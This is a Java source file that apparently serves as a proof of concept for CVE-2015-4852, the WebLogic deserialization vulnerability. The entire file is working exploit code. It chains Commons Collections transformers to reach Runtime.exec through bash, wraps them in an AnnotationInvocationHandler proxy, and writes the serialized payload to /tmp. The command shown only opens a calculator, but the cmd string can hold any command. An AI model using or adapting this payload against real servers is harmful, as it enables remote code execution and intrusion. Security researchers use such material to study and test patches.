package com.weblogcVul;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2015_4852 {
    public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        String          cmd         = "open /System/Applications/Calculator.app";
        Transformer[]   tarray      = new Transformer[]
                {
                        new ConstantTransformer( Runtime.class ),
                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})
                };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map normalMap   = new HashMap();
        Map                 lazyMap     = LazyMap.decorate( normalMap, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        InvocationHandler ih          = ( InvocationHandler )cons.newInstance( Override.class, lazyMap );
        Map                 mapProxy    = ( Map ) Proxy.newProxyInstance
                (
                        Map.class.getClassLoader(),
                        new  Class[] { Map.class },
                        ih
                );
        Object              obj         = cons.newInstance( Override.class, mapProxy );

        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/CVE_2015_4852.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
}
